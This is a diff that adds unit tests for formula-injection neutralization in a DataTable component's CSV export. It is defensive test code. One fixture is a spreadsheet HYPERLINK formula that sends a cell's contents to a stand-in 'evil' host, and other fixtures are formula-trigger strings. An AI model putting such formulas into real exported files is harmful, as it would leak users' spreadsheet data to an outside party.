@@ -2236,6 +2236,19 @@ describe('DataTable Virtualized Component', () => {
       const csv = columnsToCsv(cols, [{ id: 1, name: 'Ada', note: undefined as unknown as null }]);
       expect(csv).toBe('ID,Name,Note\r\n1,Ada,');
     });
+
+    it('neutralizes text that a spreadsheet would run as a formula (#951)', () => {
+      const rows = ['=1+1', '+cmd', '-2+3', '@SUM(A1)', '\tx', '=HYPERLINK("http://evil/?"&A1,"x")'].map((name, i) => ({ id: i, name, note: null }));
+      const lines = columnsToCsv(cols, rows).split('\r\n').slice(1).map(l => l.split(',')[1]);
+      expect(lines.slice(0, 5)).toEqual(["'=1+1", "'+cmd", "'-2+3", "'@SUM(A1)", "'\tx"]);
+      // Neutralized first, then quoted as usual (it contains quotes and a comma).
+      expect(columnsToCsv(cols, [rows[5]])).toBe('ID,Name,Note\r\n5,"\'=HYPERLINK(""http://evil/?""&A1,""x"")",');
+    });
+
+    it('leaves real numbers alone, including negatives, and neutralizes a formula-like header', () => {
+      const numCols: Column<{ id: number; delta: number }>[] = [{ key: 'id', title: 'ID' }, { key: 'delta', title: '=Delta' }];
+      expect(columnsToCsv(numCols, [{ id: 1, delta: -5 }])).toBe("ID,'=Delta\r\n1,-5");
+    });
   });
 
   describe('column show/hide (issue #340)', () => {
